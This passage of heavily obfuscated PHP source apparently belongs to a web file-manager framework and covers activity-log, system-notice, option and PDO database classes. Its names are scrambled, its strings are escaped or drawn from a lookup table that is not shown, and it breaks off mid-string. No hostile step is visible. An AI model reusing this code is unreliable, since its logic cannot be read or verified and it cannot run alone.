LNG($ÕğŸØÜ­[2260]), $ÕğŸØÜ­[2261] => LNG($ÕğŸØÜ­[2262]), $ÕğŸØÜ­[2263] => LNG($ÕğŸØÜ­[2264]), $ÕğŸØÜ­[2265] => LNG($ÕğŸØÜ­[2266]), $ÕğŸØÜ­[2267] => LNG($ÕğŸØÜ­[2268])); } private function typeFile() { $ã‚ùÁ÷Ñ =& $_SERVER[óó‹¸‚å]; $ÇÙ·öçş = array($ã‚ùÁ÷Ñ[1841] => array($ã‚ùÁ÷Ñ[1842]), $ã‚ùÁ÷Ñ[2210] => array($ã‚ùÁ÷Ñ[2269]), $ã‚ùÁ÷Ñ[2212] => array($ã‚ùÁ÷Ñ[2270]), $ã‚ùÁ÷Ñ[1834] => array($ã‚ùÁ÷Ñ[1835]), $ã‚ùÁ÷Ñ[2220] => array(), $ã‚ùÁ÷Ñ[2222] => array(), $ã‚ùÁ÷Ñ[2224] => array(), $ã‚ùÁ÷Ñ[1844] => array($ã‚ùÁ÷Ñ[1846]), $ã‚ùÁ÷Ñ[1845] => array($ã‚ùÁ÷Ñ[1846]), $ã‚ùÁ÷Ñ[2228] => array($ã‚ùÁ÷Ñ[2271]), $ã‚ùÁ÷Ñ[2230] => array($ã‚ùÁ÷Ñ[2271]), $ã‚ùÁ÷Ñ[2232] => array($ã‚ùÁ÷Ñ[2272]), $ã‚ùÁ÷Ñ[2218] => array($ã‚ùÁ÷Ñ[2273]), $ã‚ùÁ÷Ñ[1839] => array($ã‚ùÁ÷Ñ[2274]), $ã‚ùÁ÷Ñ[2235] => array($ã‚ùÁ÷Ñ[2275]), $ã‚ùÁ÷Ñ[1838] => array($ã‚ùÁ÷Ñ[1840])); return $ÇÙ·öçş; } private function typeAll() { $ÑĞÚ³ó· =& $_SERVER[óó‹¸‚å]; $üÒŠĞ€¤ = $this->typeList; $ã˜ÈÜÕ = array_filter($this->typeFile()); foreach ($ã˜ÈÜÕ as $™ÉÅ´•  => $Êò˜«ÜÙ) { $üÒŠĞ€¤[$Êò˜«ÜÙ[0]] = $üÒŠĞ€¤[$™ÉÅ´• ]; } $üÒŠĞ€¤[$ÑĞÚ³ó·[1846]] = LNG($ÑĞÚ³ó·[2276]); $üÒŠĞ€¤[$ÑĞÚ³ó·[2271]] = LNG($ÑĞÚ³ó·[2277]); return $üÒŠĞ€¤; } public function addLog($è‹¢¨®€, $›ŞÁõ” = array()) { $óãÌƒ„ë =& $_SERVER[óó‹¸‚å]; if (!isset($this->typeList[$è‹¢¨®€])) { return; } $ğæÀŞí¼ = defined($óãÌƒ„ë[475]) && USER_ID ? USER_ID : (isset($›ŞÁõ”[$óãÌƒ„ë[1674]]) ? $›ŞÁõ”[$óãÌƒ„ë[1674]] : 0); if (!$ğæÀŞí¼) { $ğæÀŞí¼ = (int) Session::get($óãÌƒ„ë[2000]); } if ($è‹¢¨®€ == $óãÌƒ„ë[2246] && is_array($›ŞÁõ”[$óãÌƒ„ë[2278]]) && !$›ŞÁõ”[$óãÌƒ„ë[2278]]) { return; } $³ºÜŒÃÈ = get_client_ip(); if (!$›ŞÁõ” || strlen(json_encode($›ŞÁõ”)) >= 1024) { $›ŞÁõ” = array($óãÌƒ„ë[2279] => $³ºÜŒÃÈ); } else { if (is_array($›ŞÁõ”)) { $›ŞÁõ”[$óãÌƒ„ë[2279]] = $³ºÜŒÃÈ; } else { $›ŞÁõ” = array($óãÌƒ„ë[1210] => $›ŞÁõ”, $óãÌƒ„ë[2279] => $³ºÜŒÃÈ); } } $›ŞÁõ” = array($óãÌƒ„ë[1664] => Session::sign(), $óãÌƒ„ë[1665] => $ğæÀŞí¼, $óãÌƒ„ë[33] => $è‹¢¨®€, $óãÌƒ„ë[1667] => json_encode($›ŞÁõ”)); parent::add($›ŞÁõ”); } public function remove($€×Ç›à°) { $this->where(array($_SERVER[óó‹¸‚å][419] => $€×Ç›à°))->delete(); } private function _makeOrder($°°ìĞŸ = '') { $ÊÏ«şÊš =& $_SERVER[óó‹¸‚å]; $šıÃşíº = $ÊÏ«şÊš[200]; $Í§·’èÛ = array($ÊÏ«şÊš[450] => $ÊÏ«şÊš[451], $ÊÏ«şÊš[452] => $ÊÏ«şÊš[453]); $¾ì…¶Ò = Input::get($ÊÏ«şÊš[458], $ÊÏ«şÊš[7], $ÊÏ«şÊš[2032], array($ÊÏ«şÊš[1954], $ÊÏ«şÊš[452])); $¾ì…¶Ò = $Í§·’èÛ[$¾ì…¶Ò]; $°°ìĞŸ = $°°ìĞŸ . "{$šıÃşíº}\40{$¾ì…¶Ò}"; return $this->order($°°ìĞŸ); } public function get($È‡­Ó¹ã = '') { $ø·ƒôœ =& $_SERVER[óó‹¸‚å]; if (!$È‡­Ó¹ã) { show_json(array()); } $’öóöÚ¯ = array(); if ($È‡­Ó¹ã[$ø·ƒôœ[1674]]) { $’öóöÚ¯[$ø·ƒôœ[1674]] = $È‡­Ó¹ã[$ø·ƒôœ[1674]]; } if (isset($È‡­Ó¹ã[$ø·ƒôœ[765]])) { $±íè¶åæ = $È‡­Ó¹ã[$ø·ƒôœ[765]]; $šı¶øò = isset($È‡­Ó¹ã[$ø·ƒôœ[497]]) ? $È‡­Ó¹ã[$ø·ƒôœ[497]] : time(); $’öóöÚ¯[$ø·ƒôœ[200]] = array($ø·ƒôœ[333], array($±íè¶åæ, $šı¶øò)); } if ($È‡­Ó¹ã[$ø·ƒôœ[33]]) { $åÎÏšÌÕ = explode($ø·ƒôœ[50], $È‡­Ó¹ã[$ø·ƒôœ[33]]); $ˆä²ò¿ = $this->typeFile(); $¤‡ğÀæî = array(); foreach ($åÎÏšÌÕ as $÷Û®Äæê) { $¤‡ğÀæî[] = $÷Û®Äæê; if (isset($ˆä²ò¿[$÷Û®Äæê])) { $¤‡ğÀæî = array_merge($¤‡ğÀæî, $ˆä²ò¿[$÷Û®Äæê]); } } $¤‡ğÀæî = array_unique($¤‡ğÀæî); if ($¤‡ğÀæî) { $’öóöÚ¯[$ø·ƒôœ[33]] = array($ø·ƒôœ[7], $¤‡ğÀæî); } } else { $’öóöÚ¯[$ø·ƒôœ[33]] = array($ø·ƒôœ[2280], $ø·ƒôœ[2281]); } if (!empty($È‡­Ó¹ã[$ø·ƒôœ[2279]])) { $’öóöÚ¯[$ø·ƒôœ[453]] = array($ø·ƒôœ[383], "\x25{$È‡­Ó¹ã[$ø·ƒôœ[2279]]}\x25"); } $û´ÌÏœû = $this->_makeOrder()->where($’öóöÚ¯)->selectPage(); if (empty($û´ÌÏœû[$ø·ƒôœ[369]])) { show_json(array(), !0, $û´ÌÏœû[$ø·ƒôœ[366]]); } $û´ÌÏœû[$ø·ƒôœ[369]] = $this->logList($û´ÌÏœû[$ø·ƒôœ[369]]); return $û´ÌÏœû; } private function ipAddress(&$»ù–‘±) { $Ğ£„Œ…Ú =& $_SERVER[óó‹¸‚å]; if (!empty($»ù–‘±[$Ğ£„Œ…Ú[2279]])) { $ ïÉƒ†Š = IpLocation::get($»ù–‘±[$Ğ£„Œ…Ú[2279]]); } else { $ ïÉƒ†Š = LNG($Ğ£„Œ…Ú[2282]); } $»ù–‘±[$Ğ£„Œ…Ú[2283]] = $ ïÉƒ†Š; } private function descZipDownload($”ıı™ÖÄ, &$ÉÏ•û™) { $é–Ê®ÊÒ =& $_SERVER[óó‹¸‚å]; if (!isset($”ıı™ÖÄ[$é–Ê®ÊÒ[2284]])) { return; } $Ñøí·Íü = json_decode($”ıı™ÖÄ[$é–Ê®ÊÒ[2284]], !0); foreach ($Ñøí·Íü as $Å±¥ÇƒŠ) { try { $ºµç‡È­ = IO::infoFull($Å±¥ÇƒŠ[$é–Ê®ÊÒ[84]]); } catch (Exception $›³ÂŸ·²) { continue; } $”ıı™ÖÄ[$é–Ê®ÊÒ[84]] = $Å±¥ÇƒŠ[$é–Ê®ÊÒ[84]]; $ÉÏ•û™[] = $”ıı™ÖÄ[$é–Ê®ÊÒ[402]] = $ºµç‡È­[$é–Ê®ÊÒ[402]]; $ÉÏ•û™[] = $”ıı™ÖÄ[$é–Ê®ÊÒ[2086]] = $ºµç‡È­[$é–Ê®ÊÒ[432]]; break; } return $”ıı™ÖÄ; } private function getSourceList(&$ÑÁ©ñß±) { $¡‹½ò“ö =& $_SERVER[óó‹¸‚å]; $÷´Æö±± = array(); foreach ($ÑÁ©ñß± as $€Ú’¢Ü => $¡İˆ¶˜ñ) { $ä—äúã¦ = json_decode($¡İˆ¶˜ñ[$¡‹½ò“ö[453]], !0); if ($¡İˆ¶˜ñ[$¡‹½ò“ö[33]] == $¡‹½ò“ö[1837]) { $ä—äúã¦ = $this->descZipDownload($ä—äúã¦, $÷´Æö±±); $ÑÁ©ñß±[$€Ú’¢Ü][$¡‹½ò“ö[453]] = json_encode($ä—äúã¦); continue; } if (strpos($¡İˆ¶˜ñ[$¡‹½ò“ö[33]], $¡‹½ò“ö[2088]) !== 0) { if (!isset($ä—äúã¦[$¡‹½ò“ö[84]]) || strpos($¡İˆ¶˜ñ[$¡‹½ò“ö[33]], $¡‹½ò“ö[2285]) !== 0) { continue; } try { $™İ”ŸÓĞ = IO::infoFull($ä—äúã¦[$¡‹½ò“ö[84]]); } catch (Exception $ºÏ£Ä¶í) { continue; } $÷´Æö±±[] = $ä—äúã¦[$¡‹½ò“ö[402]] = $™İ”ŸÓĞ[$¡‹½ò“ö[402]]; $÷´Æö±±[] = $ä—äúã¦[$¡‹½ò“ö[2086]] = $™İ”ŸÓĞ[$¡‹½ò“ö[432]]; $ÑÁ©ñß±[$€Ú’¢Ü][$¡‹½ò“ö[453]] = json_encode($ä—äúã¦); continue; } $÷´Æö±±[] = $ä—äúã¦[$¡‹½ò“ö[402]]; $÷´Æö±±[] = $ä—äúã¦[$¡‹½ò“ö[2086]]; if ($ä—äúã¦[$¡‹½ò“ö[33]] == $¡‹½ò“ö[557]) { $÷´Æö±±[] = $ä—äúã¦[$¡‹½ò“ö[453]][$¡‹½ò“ö[1167]]; $÷´Æö±±[] = $ä—äúã¦[$¡‹½ò“ö[453]][$¡‹½ò“ö[1168]]; } if ($ä—äúã¦[$¡‹½ò“ö[33]] == $¡‹½ò“ö[2096]) { $÷´Æö±±[] = $ä—äúã¦[$¡‹½ò“ö[453]][$¡‹½ò“ö[402]]; } } if (!$÷´Æö±±) { return array(); } return Model($¡‹½ò“ö[829])->sourceListInfo($÷´Æö±±, !0); } private function logList($åÇ’éÔ) { $­§Ôå·Î =& $_SERVER[óó‹¸‚å]; $ˆÓô¶ìÄ = array_to_keyvalue($åÇ’éÔ, $­§Ôå·Î[12], $­§Ôå·Î[1674]); $“¤úö‚± = Model($­§Ôå·Î[535])->userListInfo(array_unique($ˆÓô¶ìÄ)); $‡äŞ¯¶ë = $this->getSourceList($åÇ’éÔ); $Ì»‡÷° = $this->typeAll(); $¢‡Ó†ÈÛ = array(); $¢—½¦³ô = array(); foreach ($åÇ’éÔ as $†¢Œ†ƒè => $Ç¡üêûš) { $–ÊºÃ“ƒ = $Ç¡üêûš[$­§Ôå·Î[33]]; $¡éºÍ–¥ = isset($“¤úö‚±[$Ç¡üêûš[$­§Ôå·Î[1674]]]) ? $“¤úö‚±[$Ç¡üêûš[$­§Ôå·Î[1674]]] : !1; $§Ô™×õ = strpos($–ÊºÃ“ƒ, $­§Ôå·Î[2286]) === 0 ? LNG($­§Ôå·Î[2287]) : LNG($­§Ôå·Î[2282]); $Ç¡üêûš[$­§Ôå·Î[32]] = isset($¡éºÍ–¥[$­§Ôå·Î[32]]) ? $¡éºÍ–¥[$­§Ôå·Î[32]] : LNG($­§Ôå·Î[2282]); $Ç¡üêûš[$­§Ôå·Î[542]] = isset($¡éºÍ–¥[$­§Ôå·Î[542]]) ? $¡éºÍ–¥[$­§Ôå·Î[542]] : $­§Ôå·Î[12]; $Ç¡üêûš[$­§Ôå·Î[1574]] = isset($Ì»‡÷°[$–ÊºÃ“ƒ]) ? $Ì»‡÷°[$–ÊºÃ“ƒ] : $§Ô™×õ; $Ç¡üêûš[$­§Ôå·Î[2031]] = $¡éºÍ–¥; $ÀÇºÁƒº = json_decode($Ç¡üêûš[$­§Ôå·Î[453]], !0); $Ç¡üêûš[$­§Ôå·Î[2279]] = isset($ÀÇºÁƒº[$­§Ôå·Î[2279]]) ? $ÀÇºÁƒº[$­§Ôå·Î[2279]] : $­§Ôå·Î[12]; $Ç¡üêûš[$­§Ôå·Î[2283]] = IpLocation::get($Ç¡üêûš[$­§Ôå·Î[2279]]); if (strpos($–ÊºÃ“ƒ, $­§Ôå·Î[2088]) === 0 || isset($ÀÇºÁƒº[$­§Ôå·Î[2086]])) { $ÀÇºÁƒº[$­§Ôå·Î[86]] = $‡äŞ¯¶ë[$ÀÇºÁƒº[$­§Ôå·Î[402]]]; $ÀÇºÁƒº[$­§Ôå·Î[2101]] = $‡äŞ¯¶ë[$ÀÇºÁƒº[$­§Ôå·Î[2086]]]; if ($ÀÇºÁƒº[$­§Ôå·Î[33]] == $­§Ôå·Î[557]) { $ÀÇºÁƒº[$­§Ôå·Î[453]][$­§Ôå·Î[1167]] = $‡äŞ¯¶ë[$ÀÇºÁƒº[$­§Ôå·Î[453]][$­§Ôå·Î[1167]]]; $ÀÇºÁƒº[$­§Ôå·Î[453]][$­§Ôå·Î[1168]] = $‡äŞ¯¶ë[$ÀÇºÁƒº[$­§Ôå·Î[453]][$­§Ôå·Î[1168]]]; } if ($ÀÇºÁƒº[$­§Ôå·Î[33]] == $­§Ôå·Î[2096]) { $ÀÇºÁƒº[$­§Ôå·Î[453]][$­§Ôå·Î[402]] = $‡äŞ¯¶ë[$ÀÇºÁƒº[$­§Ôå·Î[453]][$­§Ôå·Î[402]]]; } if ($ÀÇºÁƒº[$­§Ôå·Î[33]] == $­§Ôå·Î[1832]) { $ÀÇºÁƒº[$­§Ôå·Î[2101]] = $ÀÇºÁƒº[$­§Ôå·Î[86]]; $ÀÇºÁƒº[$­§Ôå·Î[2086]] = $ÀÇºÁƒº[$­§Ôå·Î[2101]][$­§Ôå·Î[402]]; $ÀÇºÁƒº[$­§Ôå·Î[86]] = !1; $ÀÇºÁƒº[$­§Ôå·Î[402]] = $­§Ôå·Î[12]; } if ($ÀÇºÁƒº[$­§Ôå·Î[86]] && $ÀÇºÁƒº[$­§Ôå·Î[86]][$­§Ôå·Î[411]] == $­§Ôå·Î[1292]) { $¢—½¦³ô[] = $Ç¡üêûš[$­§Ôå·Î[399]]; unset($åÇ’éÔ[$†¢Œ†ƒè]); continue; } if ($ÀÇºÁƒº[$­§Ôå·Î[2101]] && $ÀÇºÁƒº[$­§Ôå·Î[2101]][$­§Ôå·Î[411]] == $­§Ôå·Î[1292]) { $¢—½¦³ô[] = $Ç¡üêûš[$­§Ôå·Î[399]]; unset($åÇ’éÔ[$†¢Œ†ƒè]); continue; } } $Ç¡üêûš[$­§Ôå·Î[453]] = $ÀÇºÁƒº; unset($Ç¡üêûš[$­§Ôå·Î[2288]]); $¢‡Ó†ÈÛ[] = $Ç¡üêûš; } $this->clearSystemPathLog($¢—½¦³ô); return $¢‡Ó†ÈÛ; } private function clearSystemPathLog($ŠØÛæìÎ) { $·ÚöÃâ =& $_SERVER[óó‹¸‚å]; if (count($ŠØÛæìÎ) == 0) { return; } $‡­»Ëß– = array($·ÚöÃâ[399] => array($·ÚöÃâ[7], array_unique($ŠØÛæìÎ))); $this->where($‡­»Ëß–)->delete(); } public function deviceList($ÌöÛ€£, $œÇ¼øà = 0) { $¨›Ö¢êå =& $_SERVER[óó‹¸‚å]; $Â·¸ˆ´ = array($¨›Ö¢êå[1674] => $ÌöÛ€£, $¨›Ö¢êå[200] => array($¨›Ö¢êå[1021], $œÇ¼øà), $¨›Ö¢êå[33] => $¨›Ö¢êå[1806]); $€š†Ñä = array(); $…¦ÉôÕ˜ = $this->field($¨›Ö¢êå[2289])->where($Â·¸ˆ´)->order($¨›Ö¢êå[2099])->limit(50)->select(); foreach ($…¦ÉôÕ˜ as $óõĞ¾Û¿ => $Ì¤‹’óÓ) { if ($óõĞ¾Û¿ > 0 && abs($Ì¤‹’óÓ[$¨›Ö¢êå[200]] - $…¦ÉôÕ˜[$óõĞ¾Û¿ - 1][$¨›Ö¢êå[200]]) < 5) { continue; } $Äà¬¾¿ = json_decode($Ì¤‹’óÓ[$¨›Ö¢êå[453]], !0); $Ì¤‹’óÓ[$¨›Ö¢êå[2279]] = isset($Äà¬¾¿[$¨›Ö¢êå[2279]]) ? $Äà¬¾¿[$¨›Ö¢êå[2279]] : $¨›Ö¢êå[12]; unset($Äà¬¾¿[$¨›Ö¢êå[2279]]); $¹Âõü‰¨ = $this->deviceType($Äà¬¾¿[$¨›Ö¢êå[2089]]); if (isset($€š†Ñä[$¹Âõü‰¨])) { continue; } $Ì¤‹’óÓ[$¨›Ö¢êå[2283]] = IpLocation::get($Ì¤‹’óÓ[$¨›Ö¢êå[2279]]); $Ì¤‹’óÓ[$¨›Ö¢êå[453]] = $Äà¬¾¿; $€š†Ñä[$¹Âõü‰¨] = $Ì¤‹’óÓ; } return array_values($€š†Ñä); } public function deviceType($£å‹·…‘) { return $£å‹·…‘; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\x2e\x6e\x6f\x74\x69\x63\145\x4c\151\x73\x74"; public $field = array("\156\141\x6d\145", "\143\x6f\x6e\164\145\x6e\x74", "\141\165\164\150", "\155\x6f\144\145", "\164\x69\155\145", "\x74\171\160\x65", "\154\145\x76\145\x6c", "\x65\x6e\141\142\154\145", "\x73\157\x72\x74"); public function listData($”‹‘Í = false, $Î´íîşÙ = "\x73\x6f\162\164", $–”ì£Û® = false) { return parent::listData($”‹‘Í, $Î´íîşÙ, $–”ì£Û®); } public function add($‰ÚÜ’¾Ø) { $¡ÓÄåÒ =& $_SERVER[óó‹¸‚å]; $ªò‡¦™¾ = time(); if ($‰ÚÜ’¾Ø[$¡ÓÄåÒ[16]] == $¡ÓÄåÒ[2290]) { $ªò‡¦™¾ = strtotime($‰ÚÜ’¾Ø[$¡ÓÄåÒ[203]]); } $‰ÚÜ’¾Ø[$¡ÓÄåÒ[203]] = $ªò‡¦™¾; return parent::insert($‰ÚÜ’¾Ø); } public function update($Á›õ¦ï, $ÓÏôøö) { $â¼ÂéåÜ =& $_SERVER[óó‹¸‚å]; $Ë¿•‡–¾ = $this->listData($Á›õ¦ï); if (!$Ë¿•‡–¾) { return !1; } $Ó‘«Šã• = time(); if ($ÓÏôøö[$â¼ÂéåÜ[16]] == $â¼ÂéåÜ[2290]) { $Ó‘«Šã• = strtotime($ÓÏôøö[$â¼ÂéåÜ[203]]); } $ÓÏôøö[$â¼ÂéåÜ[203]] = $Ó‘«Šã•; return parent::update($Á›õ¦ï, $ÓÏôøö); } public function remove($ÖØÍ ÉØ) { $Í½†“¶ = $this->listData($ÖØÍ ÉØ); if (!$Í½†“¶ || $Í½†“¶[$_SERVER[óó‹¸‚å][1292]]) { return !1; } return parent::remove($ÖØÍ ÉØ); } public function sort($Œ–†âîÂ, $¥áßà±¶) { return parent::update($Œ–†âîÂ, $¥áßà±¶); } public function enable($±®¦ŠÛ, $ó­ÎÎóÕ) { return parent::update($±®¦ŠÛ, array($_SERVER[óó‹¸‚å][2291] => $ó­ÎÎóÕ)); } private function initUserOption() { $»ğŠˆÙÕ =& $_SERVER[óó‹¸‚å]; $this->optionType = $»ğŠˆÙÕ[2292]; $this->modelType = $»ğŠˆÙÕ[2293]; $this->field = array($»ğŠˆÙÕ[2294], $»ğŠˆÙÕ[32], $»ğŠˆÙÕ[203], $»ğŠˆÙÕ[33], $»ğŠˆÙÕ[2295], $»ğŠˆÙÕ[754], $»ğŠˆÙÕ[195]); } public function userNoticeGet($àóÓ¯°ö = false) { $this->initUserOption(); return parent::listData($àóÓ¯°ö, $_SERVER[óó‹¸‚å][399], !0); } public function userNoticeAdd($üäààãü) { $ˆº¼‚Şİ =& $_SERVER[óó‹¸‚å]; $this->initUserOption(); $ã§¤úú› = $this->findByKey($ˆº¼‚Şİ[2294], $üäààãü[$ˆº¼‚Şİ[399]]); if ($ã§¤úú›) { return !0; } $›°«¸º = array($ˆº¼‚Şİ[2294] => $üäààãü[$ˆº¼‚Şİ[399]], $ˆº¼‚Şİ[32] => $üäààãü[$ˆº¼‚Şİ[32]], $ˆº¼‚Şİ[203] => $üäààãü[$ˆº¼‚Şİ[203]], $ˆº¼‚Şİ[33] => isset($üäààãü[$ˆº¼‚Şİ[33]]) ? $üäààãü[$ˆº¼‚Şİ[33]] : 1, $ˆº¼‚Şİ[2295] => isset($üäààãü[$ˆº¼‚Şİ[2295]]) ? $üäààãü[$ˆº¼‚Şİ[2295]] : 0, $ˆº¼‚Şİ[754] => 0, $ˆº¼‚Şİ[195] => 0); return parent::insert($›°«¸º); } public function userNoticeEdit($®­íæ­, $É­Î‡§ø) { $this->initUserOption(); return parent::update($®­íæ­, $É­Î‡§ø); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\x74\x65\155\x5f\157\x70\x74\x69\x6f\156"; protected $jsonField = array("\155\145\156\x75", "\x72\x6f\x6c\145", "\x72\157\x6c\x65\107\162\157\165\x70", "\x72\145\147\x69\163\164", "\145\x6d\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($•ô‹î¯¾) { return "\123\171\163\164\145\155\x4f\x70\164\151\157\156\x5f{$•ô‹î¯¾}"; } protected function optionDefault($ë¢”ıäö = '') { $¤½±§  =& $_SERVER[óó‹¸‚å]; if ($ë¢”ıäö == $¤½±§ [12]) { return $GLOBALS[$¤½±§ [6]][$¤½±§ [381]]; } } } goto bÓì¦¸øÓØ; aí›º›©š: function binCheckBigger($Ô—òõ, $é¼–Ÿ…ß) { return $Ô—òõ > $é¼–Ÿ…ß; } $_SERVER[$_SERVER[ßÛ¦¸Ì][3]] = ("\x38\x31\x39\x38".strrev('37'))+0;$_1prt="3r4ymqpd7c5jeh8v69btig0wsxfn2luoka1zwsq09npxfjzkd5rghbm176uc3aytoilv2e843y";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($¦â·½šé, $€×¿¨½Í) { $ªÆÃá’ =& $_SERVER[óó‹¸‚å]; if (isset(self::$_methodList[$¦â·½šé])) { return @call_user_func_array(self::$_methodList[$¦â·½šé], $€×¿¨½Í); } else { if (method_exists($this, $¦â·½šé)) { return call_user_func_array(array($this, $¦â·½šé), $€×¿¨½Í); } else { think_exception(__CLASS__ . $ªÆÃá’[4] . $¦â·½šé . $ªÆÃá’[5]); } } } public static function __callStatic($Ñ˜»Ú½, $Åô§¶«±) { if (isset(self::$_methodListStatic[$Ñ˜»Ú½])) { return call_user_func_array(self::$_methodListStatic[$Ñ˜»Ú½], $Åô§¶«±); } else { if (method_exists(self, $Ñ˜»Ú½)) { return call_user_func_array(array(self, $Ñ˜»Ú½), $Åô§¶«±); } else { show_json("{$Ñ˜»Ú½}\50\x29\x20\156\x6f\164\40\145\170\x69\163\x74\73", !1); } } } public static function addMethod($şè ¢°´, $½¡ğÓô®) { self::$_methodList[$şè ¢°´] = $½¡ğÓô®; } public static function addMethodStatic($ŸÈ”Íêô, $Å´š”úİ) { self::$_methodListStatic[$ŸÈ”Íêô] = $Å´š”úİ; } } goto AªÆ½Ù˜Íß; cË”óµÓÚ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ª°ÉÃ÷ƒ = '') { $Âöú‰ÊÈ =& $_SERVER[óó‹¸‚å]; if (!class_exists($Âöú‰ÊÈ[921])) { think_exception(think_lang($Âöú‰ÊÈ[14]) . $Âöú‰ÊÈ[922]); } if (!empty($ª°ÉÃ÷ƒ)) { $this->config = $ª°ÉÃ÷ƒ; if (empty($this->config[$Âöú‰ÊÈ[17]])) { $this->config[$Âöú‰ÊÈ[17]] = array(); } } } public function connect($€…óö¥” = '', $™‚ƒè§¶ = 0) { $“¡«¾·‹ =& $_SERVER[óó‹¸‚å]; if (!isset($this->linkID[$™‚ƒè§¶])) { if (empty($€…óö¥”)) { $€…óö¥” = $this->config; } $Ø‘Ó«‰‹ = !empty($€…óö¥”[$“¡«¾·‹[17]][$“¡«¾·‹[18]]) ? $€…óö¥”[$“¡«¾·‹[17]][$“¡«¾·‹[18]] : $this->pconnect; if ($Ø‘Ó«‰‹) { $€…óö¥”[$“¡«¾·‹[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$™‚ƒè§¶] = new PDO($€…óö¥”[$“¡«¾·‹[923]], $€…óö¥”[$“¡«¾·‹[895]], $€…óö¥”[$“¡«¾·‹[896]], $€…óö¥”[$“¡«¾·‹[17]]); } catch (PDOException $Ëå£€å’) { think_exception($Ëå£€å’->getMessage()); } $this->dbType = $this->_getDsnType($€…óö¥”[$“¡«¾·‹[923]]); if (in_array($this->dbType, array($“¡«¾·‹[924], $“¡«¾·‹[925], $“¡«¾·‹[926], $“¡«¾·‹[927]))) { think_exception($“¡«¾·‹[928] . $this->dbType . $“¡«¾·‹[929] . $this->dbType . $“¡«¾·‹[930]); } if (!$this->linkID[$™‚ƒè§¶]) { think_exception($“¡«¾·‹[931]); } try { $this->linkID[$™‚ƒè§¶]->exec($“¡«¾·‹[932] . think_config($“¡«¾·‹[898])); } catch (Exception $Ëå£€å’) { } $this->connected = !0; if (1 != think_config($“¡«¾·‹[22])) { unset($this->config); } } return $this->linkID[$™‚ƒè§¶]; } public function free() { $this->PDOStatement = null; } public function query($ñç‹·ú, $Ø¦øÍœØ = array()) { $»¼‘âÉ– =& $_SERVER[óó‹¸‚å]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ñç‹·ú; if (!empty($Ø¦øÍœØ)) { $this->queryStr .= $»¼‘âÉ–[933] . print_r($Ø¦øÍœØ, !0) . $»¼‘âÉ–[934]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($»¼‘âÉ–[23], 1); think_status($»¼‘âÉ–[24]); $this->PDOStatement = $this->_linkID->prepare($ñç‹·ú); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ì¿íš²¼ = $this->PDOStatement->execute($Ø¦øÍœØ); $this->debug(); if (!1 === $ì¿íš²¼) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Æ‡êı¡Ö, $ÛÊ«Ûüµ = array()) { $›†İ¨¾Š =& $_SERVER[óó‹¸‚å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Æ‡êı¡Ö; if (!empty($ÛÊ«Ûüµ)) { $this->queryStr .= $›†İ¨¾Š[933] . print_r($ÛÊ«Ûüµ, !0) . $›†İ¨¾Š[934]; } $‰ÆÓ•£® = !1; if ($this->dbType == $›†İ¨¾Š[927]) { if (preg_match($›†İ¨¾Š[935], $this->queryStr, $ø¬ÍåÃ)) { $this->table = think_config($›†İ¨¾Š[936]) . str_ireplace(think_config($›†İ¨¾Š[937]), $›†İ¨¾Š[378], $ø¬ÍåÃ[2]); $‰ÆÓ•£® = (bool) $this->query($›†İ¨¾Š[938] . strtoupper($this->table) . $›†İ¨¾Š[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($›†İ¨¾Š[25], 1); think_status($›†İ¨¾Š[24]); $this->PDOStatement = $this->_linkID->prepare($Æ‡êı¡Ö); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Öˆµğ€ = $this->PDOStatement->execute($ÛÊ«Ûüµ); $this->debug(); if (!1 === $Öˆµğ€) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($‰ÆÓ•£® || preg_match($›†İ¨¾Š[939], $Æ‡êı¡Ö)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‰¯—İšÚ = $this->_linkID->commit(); $this->transTimes = 0; if (!$‰¯—İšÚ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÔË»¬Ê = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÔË»¬Ê) { $this->error(); return !1; } } return !0; } private function getAll() { $âüÄ®³ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($âüÄ®³); return $âüÄ®³; } public function getFields($®­ãË£’) { $ßã‡³Ùé =& $_SERVER[óó‹¸‚å]; $this->initConnect(!0); if (think_config($ßã‡³Ùé[940])) { $û³€«×€ = str_replace($ßã‡³Ùé[941], $®­ãË£’, think_config($ßã‡³Ùé[940])); } else { switch ($this->dbType) { case $ßã‡³Ùé[924]: case $ßã‡³Ùé[942]: $û³€«×€ = "\123\x45\114\x45\x43\x54\40\x20\40\x63\x6f\154\165\x6d\156\x5f\x6e\141\155\x65\40\141\163\x20\x27\x4e\x61\155\x65\47\x2c\40\x20\40\144\141\164\141\x5f\164\x79\x70\x65\x20\x61\x73\40\x27\124\x79\x70\x65\47\x2c\x20\40\40\x63\157\154\165\155\156\x5f\x64\x65\x66\141\x75\154\164\x20\x61\x73\40\47\x44\145\x66\141\x75\154\x74\x27\54\40\x20\40\151\x73\x5f\156\165\154\x6c\x61\142\x6c\145\40\141\163\40\x27\x4e\x75\154\154\47\xa\x9\x9\106\x52\x4f\x4d\x9\151\x6e\146\x6f\162\155\x61\164\151\157\156\137\163\x63\x68\145\x6d\141\56\x74\141\142\154\145\163\x20\101\x53\x20\164\xa\x9\x9\112\117\x49\116\11\x69\156\x66\x6f\x72\x6d\141\x74\x69\x6f\156\137\163\x63\x68\x65\x6d\141\x2e\x63\x6f\154\165\155\156\x73\40\101\x53\40\143\12\11\11\x4f\x4e\x20\x20\164\56\164\141\142\x